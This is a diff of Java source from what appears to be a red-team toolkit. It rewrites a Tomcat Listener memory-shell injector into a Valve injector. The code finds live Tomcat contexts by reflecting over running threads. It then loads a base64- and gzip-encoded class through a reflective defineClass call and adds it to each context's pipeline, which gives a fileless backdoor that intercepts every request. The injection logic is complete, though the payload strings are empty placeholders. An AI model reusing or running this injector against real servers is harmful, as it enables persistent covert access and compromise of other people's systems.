@@ -1,8 +1,7 @@
 package com.potato.potatotool.content.redTeam.memshell.injector;
 
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+
+import java.io.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
@@ -12,14 +11,21 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.zip.GZIPInputStream;
 
+
 /**
- * Tomcat Listener 注入器
+ * Date: 2022/11/01
  * Author: pen4uin
- * 测试版本：
+ * Description: Tomcat Valve 注入器
+ * Tested version：
  * jdk    v1.8.0_275
- * tomcat v5.5.36, v6.0.9, v7.0.32, v8.5.83, v9.0.67
+ * tomcat v8.5.83, v9.0.67
  */
-public class TomcatListenerInjector {
+public class TomcatValveInjector {
+
+    public String getUrlPattern() {
+        return "/*";
+    }
+
 
     public String getClassName() {
         return "";
@@ -29,22 +35,22 @@ public class TomcatListenerInjector {
         return "";
     }
 
+
     static {
-        new TomcatListenerInjector();
+        new TomcatValveInjector();
     }
 
-    public TomcatListenerInjector() {
+    public TomcatValveInjector() {
         try {
             List<Object> contexts = getContext();
             for (Object context : contexts) {
-                Object listener = getListener(context);
-                addListener(context, listener);
+                Object valve = getValve(context);
+                if (valve == null) continue;
+                injectValve(context, valve);
             }
-        } catch (Exception ignored) {
-
+        } catch (Exception e) {
+            e.printStackTrace();
         }
-
-
     }
 
     public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
@@ -55,11 +61,11 @@ public class TomcatListenerInjector {
             for (Thread thread : threads) {
                 // 适配 v5/v6/7/8
                 if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
-                    HashMap childrenMap = (HashMap) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+                    HashMap childrenMap = (HashMap) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
                     // 原: map.get("localhost")
                     // 之前没有对 StandardHost 进行遍历，只考虑了 localhost 的情况，如果目标自定义了 host,则会获取不到对应的 context，导致注入失败
                     for (Object key : childrenMap.keySet()) {
-                        HashMap children = (HashMap) getFieldValue(childrenMap.get(key), "children");
+                        HashMap children = (HashMap) getFV(childrenMap.get(key), "children");
                         // 原: context = children.get("");
                         // 之前没有对context map进行遍历，只考虑了 ROOT context 存在的情况，如果目标tomcat不存在 ROOT context，则会注入失败
                         for (Object key1 : children.keySet()) {
@@ -74,7 +80,7 @@ public class TomcatListenerInjector {
                 }
                 // 适配 tomcat v9
                 else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
-                    context = getFieldValue(getFieldValue(thread.getContextClassLoader(), "resources"), "context");
+                    context = getFV(getFV(thread.getContextClassLoader(), "resources"), "context");
                     if (context != null && context.getClass().getName().contains("StandardContext"))
                         contexts.add(context);
                     if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext"))
@@ -87,61 +93,23 @@ public class TomcatListenerInjector {
         return contexts;
     }
 
-    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+    private Object getValve(Object context) {
+        Object valve = null;
+        ClassLoader classLoader = context.getClass().getClassLoader();
         try {
-            return (ClassLoader) invokeMethod(context, "getClassLoader", null, null);
-        } catch (Exception ignored) {
-            Object loader = invokeMethod(context, "getLoader", null, null);
-            return (ClassLoader) invokeMethod(loader, "getClassLoader", null, null);
-        }
-    }
-
-    private Object getListener(Object context) throws Exception {
-
-        Object listener = null;
-        ClassLoader classLoader = getWebAppClassLoader(context);
-        try {
-            listener = classLoader.loadClass(getClassName()).newInstance();
+            valve = classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             try {
                 byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                 Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                 defineClass.setAccessible(true);
                 Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-                listener = clazz.newInstance();
-            } catch (Throwable tt) {
+                valve = clazz.newInstance();
+            } catch (Exception e2) {
+                e2.printStackTrace();
             }
         }
-        return listener;
-    }
-
-    public void addListener(Object context, Object listener) throws Exception {
-        if (isInjected(context, listener.getClass().getName())) {
-            return;
-        }
-        try {
-            invokeMethod(context, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{listener});
-        } catch (Exception e) {
-            Object[] objects = (Object[]) invokeMethod(context, "getApplicationEventListeners");
-            List listeners = Arrays.asList(objects);
-            ArrayList arrayList = new ArrayList(listeners);
-            arrayList.add(listener);
-            // (Object) 类型转换 解决 tomcat v5/v6 IllegalArgumentException: argument type mismatch
-            //context.getClass().getMethod("setApplicationEventListeners",Object[].class).invoke(context, (Object) arrayList.toArray());
-            invokeMethod(context, "setApplicationEventListeners", new Class[]{Object[].class}, new Object[]{(Object) arrayList.toArray()});
-        }
-    }
-
-    public boolean isInjected(Object context, String evilClassName) throws Exception {
-        Object[] objects = (Object[]) invokeMethod(context, "getApplicationEventListeners");
-        List listeners = Arrays.asList(objects);
-        ArrayList arrayList = new ArrayList(listeners);
-        for (int i = 0; i < arrayList.size(); i++) {
-            if (arrayList.get(i).getClass().getName().contains(evilClassName)) {
-                return true;
-            }
-        }
-        return false;
+        return valve;
     }
 
     static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
@@ -168,28 +136,63 @@ public class TomcatListenerInjector {
         return out.toByteArray();
     }
 
-    static Object getFieldValue(Object obj, String fieldName) throws Exception {
-        Field field = getField(obj, fieldName);
-        field.setAccessible(true);
-        return field.get(obj);
-    }
 
-    static Field getField(Object obj, String fieldName) throws NoSuchFieldException {
-        Class<?> clazz = obj.getClass();
-        while (clazz != null) {
-            try {
-                Field field = clazz.getDeclaredField(fieldName);
-                field.setAccessible(true);
-                return field;
-            } catch (NoSuchFieldException e) {
-                clazz = clazz.getSuperclass();
+    public boolean isInjected(Object context, String valveClassName) throws Exception {
+        Object obj = invokeMethod(context, "getPipeline");
+        Object[] valves = (Object[]) invokeMethod(obj, "getValves");
+        List<Object> valvesList = Arrays.asList(valves);
+        for (Object valve : valvesList) {
+            if (valve.getClass().getName().contains(valveClassName)) {
+                return true;
             }
         }
-        throw new NoSuchFieldException(fieldName);
+        return false;
     }
 
-    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
-        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
+    public void injectValve(Object context, Object valve) throws Exception {
+        if (isInjected(context, valve.getClass().getName())) {
+            return;
+        }
+        try {
+            Class ValveClass;
+            try {
+                ValveClass = Thread.currentThread().getContextClassLoader().loadClass("org.apache.catalina.Valve");
+            } catch (Exception e) {
+                ValveClass = context.getClass().getClassLoader().loadClass("org.apache.catalina.Valve");
+            }
+            Object obj = invokeMethod(context, "getPipeline");
+            // Object obj = STANDARD_CONTEXT.getClass().getMethod("getPipeline").invoke(STANDARD_CONTEXT);
+            // obj.getClass().getMethod("addValve", Class.forName("org.apache.catalina.Valve")).invoke(obj,evilValve);
+            invokeMethod(obj, "addValve", new Class[]{ValveClass}, new Object[]{valve});
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+
+    private static synchronized Object getFV(Object var0, String var1) throws Exception {
+        Field var2 = null;
+        Class var3 = var0.getClass();
+
+        while (var3 != Object.class) {
+            try {
+                var2 = var3.getDeclaredField(var1);
+                break;
+            } catch (NoSuchFieldException var5) {
+                var3 = var3.getSuperclass();
+            }
+        }
+
+        if (var2 == null) {
+            throw new NoSuchFieldException(var1);
+        } else {
+            var2.setAccessible(true);
+            return var2.get(var0);
+        }
+    }
+
+    private static synchronized Object invokeMethod(final Object obj, final String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
+        return invokeMethod(obj, methodName, new Class[0], new Object[0]);
     }
 
     public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
